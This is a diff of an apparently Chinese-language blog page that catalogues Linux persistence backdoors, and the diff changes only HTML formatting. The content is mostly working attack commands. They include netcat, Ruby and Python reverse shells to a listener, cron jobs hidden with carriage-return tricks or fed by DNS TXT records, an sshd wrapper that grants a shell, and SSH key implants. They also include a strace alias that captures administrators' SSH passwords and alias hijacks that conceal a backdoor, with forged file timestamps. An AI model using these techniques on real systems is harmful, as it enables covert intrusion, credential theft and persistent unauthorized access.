@@ -253,245 +253,245 @@
 
 <span id="more"></span>
 <hr>
-<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -l payloads | grep &#39;cmd&#x2F;unix&#x2F;reverse&#39;
+<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><pre><code>msfvenom -l payloads | grep &#39;cmd/unix/reverse&#39;
 
-    cmd&#x2F;unix&#x2F;reverse                                    Creates an interactive shell through two inbound connections
-    cmd&#x2F;unix&#x2F;reverse_awk                                Creates an interactive shell via GNU AWK
-    cmd&#x2F;unix&#x2F;reverse_bash                               Creates an interactive shell via bash&#39;s builtin &#x2F;dev&#x2F;tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the &#x2F;dev&#x2F;tcp feature.
-    cmd&#x2F;unix&#x2F;reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without &#x2F;dev&#x2F;tcp support. This module uses the &#39;-z&#39; option included on some systems to encrypt using SSL.
-    cmd&#x2F;unix&#x2F;reverse_bash_udp                           Creates an interactive shell via bash&#39;s builtin &#x2F;dev&#x2F;udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the &#x2F;dev&#x2F;udp feature.
-    cmd&#x2F;unix&#x2F;reverse_jjs                                Connect back and create a command shell via jjs
-    cmd&#x2F;unix&#x2F;reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#39;t usually installed by default.
-    cmd&#x2F;unix&#x2F;reverse_lua                                Creates an interactive shell via Lua
-    cmd&#x2F;unix&#x2F;reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode
-    cmd&#x2F;unix&#x2F;reverse_netcat                             Creates an interactive shell via netcat
-    cmd&#x2F;unix&#x2F;reverse_netcat_gaping                      Creates an interactive shell via netcat
-    cmd&#x2F;unix&#x2F;reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs
-    cmd&#x2F;unix&#x2F;reverse_openssl                            Creates an interactive shell through two inbound connections
-    cmd&#x2F;unix&#x2F;reverse_perl                               Creates an interactive shell via perl
-    cmd&#x2F;unix&#x2F;reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL
-    cmd&#x2F;unix&#x2F;reverse_php_ssl                            Creates an interactive shell via php, uses SSL
-    cmd&#x2F;unix&#x2F;reverse_python                             Connect back and create a command shell via Python
-    cmd&#x2F;unix&#x2F;reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
-    cmd&#x2F;unix&#x2F;reverse_r                                  Connect back and create a command shell via R
-    cmd&#x2F;unix&#x2F;reverse_ruby                               Connect back and create a command shell via Ruby
-    cmd&#x2F;unix&#x2F;reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL
-    cmd&#x2F;unix&#x2F;reverse_socat_udp                          Creates an interactive shell via socat
-    cmd&#x2F;unix&#x2F;reverse_ssh                                Connect back and create a command shell via SSH
-    cmd&#x2F;unix&#x2F;reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option
-    cmd&#x2F;unix&#x2F;reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)
-    cmd&#x2F;unix&#x2F;reverse_tclsh                              Creates an interactive shell via Tclsh
-    cmd&#x2F;unix&#x2F;reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#39;t usually installed by default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
+    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
+    cmd/unix/reverse_bash                               Creates an interactive shell via bash&#39;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.
+    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &#39;-z&#39; option included on some systems to encrypt using SSL.
+    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&#39;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.
+    cmd/unix/reverse_jjs                                Connect back and create a command shell via jjs
+    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#39;t usually installed by default.
+    cmd/unix/reverse_lua                                Creates an interactive shell via Lua
+    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode
+    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat
+    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat
+    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs
+    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections
+    cmd/unix/reverse_perl                               Creates an interactive shell via perl
+    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL
+    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL
+    cmd/unix/reverse_python                             Connect back and create a command shell via Python
+    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
+    cmd/unix/reverse_r                                  Connect back and create a command shell via R
+    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
+    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL
+    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat
+    cmd/unix/reverse_ssh                                Connect back and create a command shell via SSH
+    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option
+    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)
+    cmd/unix/reverse_tclsh                              Creates an interactive shell via Tclsh
+    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#39;t usually installed by default
+</code></pre>
+<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><pre><code>msfvenom -p &lt;payload&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;
 
-<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -p &lt;payload&gt; LHOST&#x3D;&lt;LHOST&gt; LPORT&#x3D;&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;
-
-msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST&#x3D;&lt;LHOST&gt; LPORT&#x3D;&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
+msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;
+</code></pre>
 <p>refer: <a href="https://l0n9w4y.cc/posts/16803/">https://l0n9w4y.cc/posts/16803/</a></p>
 <h3 id="3-meterpreter-shell"><a href="#3-meterpreter-shell" class="headerlink" title="3. meterpreter shell"></a>3. meterpreter shell</h3><p>shell升级为 meterpreter shell</p>
 <p>攻击机配置msf 监听：</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+<pre><code>use exploit/multi/handler
 
-set payload linux&#x2F;x86&#x2F;shell&#x2F;reverse_tcp
+set payload linux/x86/shell/reverse_tcp
 
 set lport 6666
 
 set lhost 192.168.1.1
 
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+run
+</code></pre>
 <p>目标主机上反弹shell</p>
-<pre class="line-numbers language-none"><code class="language-none">rm -f &#x2F;tmp&#x2F;f; mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; &#x2F;tmp&#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code>rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; /tmp/f
+</code></pre>
 <p>获取一个普通shell, 在这个shell中输入 background, 在对话中选择 y, 将shell放在了后台</p>
 <p>使用 sessions -u 1 将普通shell提升为 meterpreter shell</p>
 <p>sessions命令查看shell会话，sessions -i id 切换到目标shell</p>
-<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><pre class="line-numbers language-none"><code class="language-none">1) sudo find &#x2F; -name &#39;cron*&#39; | egrep -v &#39;man|doc&#39; | sort -u
+<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><pre><code>1) sudo find / -name &#39;cron*&#39; | egrep -v &#39;man|doc&#39; | sort -u
 
-2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &#39;doc|man&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &#39;doc|man&#39;
+</code></pre>
+<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><pre><code>1) 用户允许/禁止配置文件
 
-<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><pre class="line-numbers language-none"><code class="language-none">1) 用户允许&#x2F;禁止配置文件
+- /etc/cron.deny ：用来禁止一些用户使用cron服务的配置文件
 
-- &#x2F;etc&#x2F;cron.deny ：用来禁止一些用户使用cron服务的配置文件
-
-- &#x2F;etc&#x2F;cron.allow ：允许一些用户来使用cron服务的配置文件，优先级高
+- /etc/cron.allow ：允许一些用户来使用cron服务的配置文件，优先级高
 
 2) 系统配置项：系统执行的计划任务
 
-- &#x2F;etc&#x2F;crontab 
+- /etc/crontab 
 
-- &#x2F;etc&#x2F;cron.d&#x2F;
+- /etc/cron.d/
 
 3) 用户配置项：执行crontab命令操作的目录
 
-- &#x2F;var&#x2F;spool&#x2F;cron
+- /var/spool/cron
 
 4) 其他计划任务文件
 
-    &#x2F;etc&#x2F;cron.daily
-    &#x2F;etc&#x2F;cron.deny
-    &#x2F;etc&#x2F;cron.hourly
-    &#x2F;etc&#x2F;cron.monthly
-    &#x2F;etc&#x2F;cron.weekly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    /etc/cron.daily
+    /etc/cron.deny
+    /etc/cron.hourly
+    /etc/cron.monthly
+    /etc/cron.weekly
+</code></pre>
 <p>定时任务在线生成器：<a target="_blank" rel="noopener" href="https://crontab.guru/">https://crontab.guru/</a></p>
 <h3 id="3-计划任务隐藏后门"><a href="#3-计划任务隐藏后门" class="headerlink" title="3. 计划任务隐藏后门"></a>3. 计划任务隐藏后门</h3><p>隐藏思路</p>
-<pre class="line-numbers language-none"><code class="language-none">1) 不使用用户cron配置项：避免crontab命令查看计划任务内容
+<pre><code>1) 不使用用户cron配置项：避免crontab命令查看计划任务内容
 
-2) 不使用常用目录及文件如：&#x2F;var&#x2F;spool&#x2F;cron、&#x2F;etc&#x2F;crontab等
+2) 不使用常用目录及文件如：/var/spool/cron、/etc/crontab等
 
-3) 劫持&#x2F;修改系统默认的计划任务文件：伪装文件名&#x2F;文件位置
+3) 劫持/修改系统默认的计划任务文件：伪装文件名/文件位置
 
-如：&#x2F;etc&#x2F;cron.daily 、&#x2F;etc&#x2F;cron.hourly目录下自带文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+如：/etc/cron.daily 、/etc/cron.hourly目录下自带文件
+</code></pre>
 <p>隐藏技巧</p>
-<pre class="line-numbers language-none"><code class="language-none">1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到
+<pre><code>1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到
 
-(crontab -l;printf &quot;*&#x2F;1 * * * * &#x2F;root&#x2F;.devops.sh;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -
+(crontab -l;printf &quot;*/1 * * * * /root/.devops.sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -
 
 2) 使用DNS的TXT记录，通过解析这个记录来进行执行，使用linux.org等公共域名进行隐藏
 
-0 1 * * * &#x2F;bin&#x2F;sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+0 1 * * * /bin/sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;
+</code></pre>
 <p>refer：<a target="_blank" rel="noopener" href="https://blog.sucuri.net/2019/05/cronjob-backdoors.html">https://blog.sucuri.net/2019/05/cronjob-backdoors.html</a></p>
-<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><pre class="line-numbers language-none"><code class="language-none">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;6666;
+<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=6666;
 
-ssh root@x.x.x.x -p 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+ssh root@x.x.x.x -p 6666
+</code></pre>
+<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><pre><code>cd /usr/sbin/
+mv sshd ../bin
+vim sshd //编辑sshd内容为以下
 
-<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;sbin&#x2F;
-mv sshd ..&#x2F;bin
-vim sshd &#x2F;&#x2F;编辑sshd内容为以下
-
-#!&#x2F;usr&#x2F;bin&#x2F;perl
-exec&quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN)&#x3D;~&#x2F;^..0V&#x2F;); &#x2F;&#x2F; \x00\x000V是22222的大端形式
-exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125;&quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV;
+#!/usr/bin/perl
+exec&quot;/bin/sh&quot; if(getpeername(STDIN)=~/^..0V/); // \x00\x000V是22222的大端形式
+exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;
 
 重启sshd
 service sshd restart
 
 本机执行
-socat STDIO TCP4:127.0.0.1:22,sourceport&#x3D;22222
+socat STDIO TCP4:127.0.0.1:22,sourceport=22222
 
 修改源端口
 import struct
-buffer &#x3D; struct.pack(&#39;&gt;I&#39;,22222)
-print(buffer)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+buffer = struct.pack(&#39;&gt;I&#39;,22222)
+print(buffer)
+</code></pre>
 <h3 id="3-SSH公钥后门"><a href="#3-SSH公钥后门" class="headerlink" title="3. SSH公钥后门"></a>3. SSH公钥后门</h3><p>攻击机中使用 ssh-keygen -t rsa 生成公私钥</p>
 <p>将公钥 id_rsa.pub 上传到目标主机，保存为 ~&#x2F;.ssh&#x2F;authorized_keys</p>
-<pre class="line-numbers language-none"><code class="language-none">ssh user@host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code>ssh user@host
+</code></pre>
+<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><pre><code># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码
+alias ssh=&#39;strace -o /tmp/.sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read.write.connect -s 2048 ssh&#39;
 
-<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><pre class="line-numbers language-none"><code class="language-none"># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码
-alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read.write.connect -s 2048 ssh&#39;
-
-grep &quot;read(5&quot; &#x2F;tmp&#x2F;.sshpwdxxxxxxxx.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
+grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log
+</code></pre>
 <h2 id="0x04-alias后门"><a href="#0x04-alias后门" class="headerlink" title="0x04 alias后门"></a>0x04 alias后门</h2><h3 id="1-后门存放位置"><a href="#1-后门存放位置" class="headerlink" title="1. 后门存放位置"></a>1. 后门存放位置</h3><p>系统启动默认加载的配置文件</p>
-<pre class="line-numbers language-none"><code class="language-none">1) &#x2F;etc&#x2F;profile
+<pre><code>1) /etc/profile
 
-【系统级】Linux是一个多用户操作系统。用户登录或切换（即Login shell 启动）时都有一个专用的运行环境，但首先执行 &#x2F;etc&#x2F;profile
+【系统级】Linux是一个多用户操作系统。用户登录或切换（即Login shell 启动）时都有一个专用的运行环境，但首先执行 /etc/profile
 
-2) &#x2F;etc&#x2F;bashrc
+2) /etc/bashrc
 
 【系统级】在 bash shell 打开时运行，修改该文件配置的环境变量将会影响所有用户使用的bash shell
 
-3) ~&#x2F;.bashrc
+3) ~/.bashrc
 
 【用户级】当用户登录时以及每次打开新的shell时该文件都将被读取，不推荐在这里配置用户专用的环境变量，因为每开一个shell，该文件都会被读取一次
 
-4) ~&#x2F;.bash_profile &amp;&amp; ~.&#x2F;bash_login
+4) ~/.bash_profile &amp;&amp; ~./bash_login
 
 【用户级】
 
-如果有其中的一个文件存在的话, 当启动的是一个登录shell时，Bash 会执行该文件而不会执行~&#x2F;.profile 
+如果有其中的一个文件存在的话, 当启动的是一个登录shell时，Bash 会执行该文件而不会执行~/.profile 
 
-如果两个文件都存在的话，Bash 将会优先执行~&#x2F;.bash_profile 而不是~&#x2F;.bash_login 
+如果两个文件都存在的话，Bash 将会优先执行~/.bash_profile 而不是~/.bash_login 
 
-5) ~&#x2F;.bash_logout
+5) ~/.bash_logout
 
-【用户级】当每次退出系统(退出bash shell)时执行该文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+【用户级】当每次退出系统(退出bash shell)时执行该文件
+</code></pre>
 <h3 id="2-后门制作"><a href="#2-后门制作" class="headerlink" title="2. 后门制作"></a>2. 后门制作</h3><p>当前用户目录下.bashrc</p>
-<pre class="line-numbers language-none"><code class="language-none">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s 2048 ssh&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code>alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s 2048 ssh&#39;
+</code></pre>
 <p>创建alias后门</p>
-<pre class="line-numbers language-none"><code class="language-none">1) 受控端创建别名
+<pre><code>1) 受控端创建别名
 
-alias ls&#x3D;&quot;alerts()&#123; ls $* --color&#x3D;auto;ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;&#39;&quot;&#39;&quot;192.168.1.1&quot;&#39;&quot;&#39;&quot;,&quot;&#39;&quot;&#39;&quot;6666&quot;&#39;&quot;&#39;&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;&#39;&quot;&#39;&quot;r&quot;&#39;&quot;&#39;&quot;)&#123;|io|c.print io.read&#125;end&#39;;&#125;;alerts&quot;
+alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;&#39;&quot;&#39;&quot;192.168.1.1&quot;&#39;&quot;&#39;&quot;,&quot;&#39;&quot;&#39;&quot;6666&quot;&#39;&quot;&#39;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#39;&quot;&#39;&quot;r&quot;&#39;&quot;&#39;&quot;)&#123;|io|c.print io.read&#125;end&#39;;&#125;;alerts&quot;
 
 2）攻击端监听本地端口
 
 nc -lvnp 6666
 
-3) 受控端执行别名命令，攻击端获得反弹shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+3) 受控端执行别名命令，攻击端获得反弹shell
+</code></pre>
 <h3 id="3-后门隐藏"><a href="#3-后门隐藏" class="headerlink" title="3. 后门隐藏"></a>3. 后门隐藏</h3><p>alias命令可以查看当前的别名，会让别名后门暴露。因此需要劫持alias命令，使输出中不显示后门指令。</p>
 <p>另外unalias命令会清除别名，也需要对其进行劫持，避免后门指令的别名被清除。</p>
 <p><strong>1）创建unalias别名</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">alias unalias&#x3D;&#39;alerts()&#123; if [ $# !&#x3D; 0 ]; then if [ $* !&#x3D; &quot;ls&quot; ]&amp;&amp;[ $* !&#x3D; &quot;alias&quot; ]&amp;&amp;[ $* !&#x3D; &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code>alias unalias=&#39;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#39;
+</code></pre>
 <p><strong>2) 创建alias的别名</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">劫持前先将当前alias结果保存至比较隐蔽的文件
-alias &gt; &#x2F;etc&#x2F;gnupg&#x2F;.gnupg
+<pre><code>劫持前先将当前alias结果保存至比较隐蔽的文件
+alias &gt; /etc/gnupg/.gnupg
 
-alias alias&#x3D;&quot;cat &#x2F;etc&#x2F;gnupg&#x2F;.gnupg&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
+alias alias=&quot;cat /etc/gnupg/.gnupg&quot;
+</code></pre>
 <p><strong>3) 文件位置隐蔽</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1) 在正常的位置创建合理的文件
-vi &#x2F;etc&#x2F;yum&#x2F;yum-update.rc  &#x2F;&#x2F;创建文件，加入别名设置
+<pre><code>1) 在正常的位置创建合理的文件
+vi /etc/yum/yum-update.rc  //创建文件，加入别名设置
 
-alias ls&#x3D;&quot;alerts()&#123; ls $* --color&#x3D;auto;ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;&#39;&quot;&#39;&quot;192.168.1.1&quot;&#39;&quot;&#39;&quot;,&quot;&#39;&quot;&#39;&quot;6666&quot;&#39;&quot;&#39;&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;&#39;&quot;&#39;&quot;r&quot;&#39;&quot;&#39;&quot;)&#123;|io|c.print io.read&#125;end&#39;;&#125;;alerts&quot;
+alias ls=&quot;alerts()&#123; ls $* --color=auto;ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;&#39;&quot;&#39;&quot;192.168.1.1&quot;&#39;&quot;&#39;&quot;,&quot;&#39;&quot;&#39;&quot;6666&quot;&#39;&quot;&#39;&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;&#39;&quot;&#39;&quot;r&quot;&#39;&quot;&#39;&quot;)&#123;|io|c.print io.read&#125;end&#39;;&#125;;alerts&quot;
 
-alias unalias&#x3D;&#39;alerts()&#123; if [ $# !&#x3D; 0 ]; then if [ $* !&#x3D; &quot;ls&quot; ]&amp;&amp;[ $* !&#x3D; &quot;alias&quot; ]&amp;&amp;[ $* !&#x3D; &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#39;
+alias unalias=&#39;alerts()&#123; if [ $# != 0 ]; then if [ $* != &quot;ls&quot; ]&amp;&amp;[ $* != &quot;alias&quot; ]&amp;&amp;[ $* != &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#39;
 
-alias alias&#x3D;&quot;cat &#x2F;etc&#x2F;gnupg&#x2F;.gnupg&quot;
+alias alias=&quot;cat /etc/gnupg/.gnupg&quot;
 
 2) 将正常文件的时间复制给包含alias的文件
 
-touch -acmr version-groups.conf yum-update.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+touch -acmr version-groups.conf yum-update.rc
+</code></pre>
+<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><pre><code>// 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门
 
-<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门
+cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile json.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f json.py
 
-cd &#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile json.py&quot;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f json.py
-
-&#x2F;&#x2F; 脚本代码
+// 脚本代码
 
 import socket, subprocess, os;
-s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
 s.connect((&quot;192.168.121.1&quot;, 6666));
 os.dup2(s.fileno(), 0);
 os.dup2(s.fileno(), 1);
 os.dup2(s.fileno(), 2);
-p &#x3D; subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-i&quot;]);
+p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;]);
 
